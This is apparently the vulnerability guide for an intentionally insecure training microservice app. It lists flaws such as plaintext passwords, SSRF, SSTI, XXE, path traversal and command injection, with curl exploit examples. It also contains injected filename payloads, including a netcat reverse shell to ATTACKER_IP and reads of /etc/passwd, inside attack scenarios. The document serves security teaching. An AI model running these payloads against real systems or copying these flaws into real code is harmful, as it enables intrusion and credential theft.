# Security Vulnerabilities Documentation

This document outlines the intentional security vulnerabilities present in this microservice application for educational and security testing purposes.

## Auth Service (Port 3000)

### 1. Plaintext Password Storage
**Location:** `auth/authController.js:69`, `auth/authController.js:242`
**Severity:** CRITICAL
**Description:** Passwords are stored in plaintext in the database without any hashing or encryption.
**Exploit:** Database compromise leads to immediate credential theft.

### 2. Weak Password Comparison
**Location:** `auth/authController.js:98`
**Severity:** HIGH
**Description:** Direct string comparison for password validation without constant-time comparison.
**Exploit:** Susceptible to timing attacks to enumerate valid passwords.

### 3. Weak Isolation on Dual-Use Endpoint (NEW)
**Location:** `auth/authController.js:188-255`
**Severity:** CRITICAL
**Description:** The `/reset-password` endpoint accepts THREE different authentication methods:
- Path 1: JWT token from cookies (authenticated users)
- Path 2: Reset token from request body (password reset flow)
- Path 3: Email parameter only (NO verification required!)

**Vulnerabilities:**
- An attacker can reset ANY user's password by just providing their email in the request body
- No proper isolation between authenticated and unauthenticated paths
- Multiple authentication paths create confusion and bypass opportunities
- The email-based path bypasses all token verification

**Exploit Example:**
```bash
# Reset any user's password without a token!
curl -X POST http://localhost:3000/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "email": "victim@example.com",
    "password": "hacked123",
    "confirmPassword": "hacked123"
  }'
```

### 4. Information Leakage
**Location:** `auth/authController.js:150`
**Severity:** MEDIUM
**Description:** Reset tokens are logged to console in DEBUG messages.
**Exploit:** Server logs may expose password reset tokens.

## Settings Service (Port 4000)

### 1. Mass Assignment Vulnerability
**Location:** `setting/userSetting.js:166`
**Severity:** CRITICAL
**Description:** Takes entire `req.body` as `userId` instead of `req.user.id` in settings reset endpoint.
**Exploit:** Attacker can reset ANY user's settings by manipulating the request body.

**Exploit Example:**
```bash
curl -X POST http://localhost:4000/settings/reset \
  -H "Content-Type: application/json" \
  -H "Cookie: token=VALID_JWT_TOKEN" \
  -d '{"userId": "victim-user-id-here"}'
```

### 2. Logic Error in Username Change
**Location:** `setting/userSetting.js:115-122`
**Severity:** LOW
**Description:** Checks if username equals new username AFTER the update operation, making the check useless.
**Exploit:** Minor confusion in error messages, no security impact.

### 3. Plaintext Password Storage
**Location:** `setting/userSetting.js:150`
**Severity:** CRITICAL
**Description:** Password changes store plaintext passwords.
**Exploit:** Same as auth service - database compromise leads to credential theft.

## Notification Service (Port 5000)

### 1. Server-Side Request Forgery (SSRF)
**Location:** `notification/notificationService.js:80-94`
**Severity:** CRITICAL
**Description:** The `/webhook/trigger` endpoint accepts arbitrary URLs and makes HTTP requests to them without validation.
**Exploit:** Access internal services (e.g., MongoDB, metadata services), scan internal ports, or perform denial of service.

**Exploit Example:**
```bash
curl -X POST http://localhost:5000/webhook/trigger \
  -H "Content-Type: application/json" \
  -H "Cookie: token=VALID_JWT_TOKEN" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "method": "GET"
  }'
```

### 2. Template Injection (SSTI)
**Location:** `notification/notificationService.js:118-125`, `notification/notificationService.js:154-159`
**Severity:** CRITICAL
**Description:** The `/template/create` endpoint allows creating templates with user-controlled content that is later compiled and executed by Handlebars in `/template/send`.
**Exploit:** Remote Code Execution (RCE) via Handlebars template injection payloads.

### 3. Insecure Direct Object Reference (IDOR)
**Location:** `notification/notificationService.js:192-198`
**Severity:** HIGH
**Description:** The `/notifications/:userId` endpoint allows retrieving notifications for any user ID without authorization checks.
**Exploit:** View sensitive notifications of other users.

### 4. XML External Entity (XXE)
**Location:** `notification/notificationService.js:254-266`
**Severity:** HIGH
**Description:** The `/send/sms/xml` endpoint parses XML input without disabling external entities.
**Exploit:** Read local files, perform SSRF, or DoS via XML payloads.

### 5. Insecure Deserialization
**Location:** `notification/notificationService.js:283-290`
**Severity:** HIGH
**Description:** The `/send/batch` endpoint uses `JSON.parse` on untrusted input, which is a placeholder for insecure deserialization vulnerabilities common in other formats (like Python pickle or Java serialization).

## File Upload Service (Port 6000)

### 1. Unrestricted File Upload
**Location:** `upload/uploadService.js:59-78`, `upload/uploadService.js:87-116`
**Severity:** CRITICAL
**Description:** The `/upload` endpoint performs no validation on file types, extensions, or content. It also uses the original filename provided by the user.
**Exploit:** Upload malicious scripts (webshells), executables, or HTML files for Stored XSS.

### 2. Path Traversal
**Location:** `upload/uploadService.js:125-132`
**Severity:** HIGH
**Description:** The `/download/:filename` endpoint joins the user-provided filename directly with the upload directory path without sanitization.
**Exploit:** Download arbitrary files from the server filesystem (e.g., `/etc/passwd`).

**Exploit Example:**
```bash
curl "http://localhost:6000/download/..%2F..%2F..%2Fetc%2Fpasswd" \
  -H "Cookie: token=VALID_JWT_TOKEN"
```

### 3. Command Injection
**Location:** `upload/uploadService.js:191-209`
**Severity:** CRITICAL
**Description:** The `/process/:fileId` endpoint uses the filename in shell commands (`file`, `gzip`, `md5sum`) without sanitization.
**Exploit:** Execute arbitrary system commands.

**Exploit Example:**
Upload a file named `; cat /etc/passwd #.txt` and then trigger the process endpoint.

### 4. Insecure Direct Object Reference (IDOR)
**Location:** `upload/uploadService.js:235-252`
**Severity:** HIGH
**Description:** The `/delete/:fileId` endpoint allows deleting any file by ID without checking ownership.
**Exploit:** Delete files belonging to other users.

### 5. Public Access / Information Disclosure
**Location:** `upload/uploadService.js:283-298`
**Severity:** MEDIUM
**Description:** The `/public/:filename` endpoint exposes files without any authentication.
**Exploit:** Access sensitive uploaded files if filenames are guessed or leaked.

### 6. Zip Slip / Command Injection
**Location:** `upload/uploadService.js:317-325`
**Severity:** CRITICAL
**Description:** The `/extract` endpoint extracts archives using `unzip` with user-controlled paths, allowing files to be written outside the target directory (Zip Slip) and vulnerable to command injection via the filename/path.

## Common Vulnerabilities Across Services

### 1. No Rate Limiting
**Severity:** HIGH
**Description:** No rate limiting on any endpoints.
**Exploit:** Brute force attacks, DoS attacks.

### 2. Verbose Error Messages
**Severity:** LOW
**Description:** Error messages may reveal system internals.
**Exploit:** Information gathering for targeted attacks.

### 3. Missing Input Validation
**Severity:** MEDIUM
**Description:** Minimal validation on user inputs.
**Exploit:** Injection attacks, malformed data handling issues.

## Testing Recommendations

1. Use Burp Suite or OWASP ZAP for manual testing
2. Run automated scanners (nikto, sqlmap, etc.)
3. Practice JWT manipulation attacks
4. Test IDOR (Insecure Direct Object Reference) vulnerabilities
5. Attempt privilege escalation scenarios
6. Test rate limiting bypass techniques
7. **New:** Test SSRF using Burp Collaborator or a listening server
8. **New:** Test Command Injection with time-based payloads (e.g., `sleep 10`)
9. **New:** Test Path Traversal with standard payloads (`../../`)

## Security Training Scenarios

### Scenario 1: Complete Account Takeover
1. Enumerate users via timing attacks on login
2. Reset victim's password via weak isolation vulnerability
3. Login as victim
4. Modify victim's settings via mass assignment

### Scenario 2: Remote Code Execution (RCE)
1. Register and login
2. Upload a file named `; nc -e /bin/sh ATTACKER_IP PORT #.txt` via Upload Service
3. Trigger the `/process` endpoint for that file
4. Catch the reverse shell on your listener

### Scenario 3: Internal Network Reconnaissance
1. Login to the application
2. Use Notification Service `/webhook/trigger` endpoint
3. Fuzz the `url` parameter to scan internal ports (e.g., `http://localhost:27017`)
4. Map out internal services

### Scenario 4: Data Exfiltration via XXE
1. Login to the application
2. Send a POST request to `/send/sms/xml` with a malicious XML payload
3. Define an external entity pointing to `/etc/passwd` or internal URLs
4. Read sensitive file contents in the response or error logs

## Disclaimer

These vulnerabilities are INTENTIONAL for educational purposes. Never deploy this application in a production environment or expose it to the public internet.
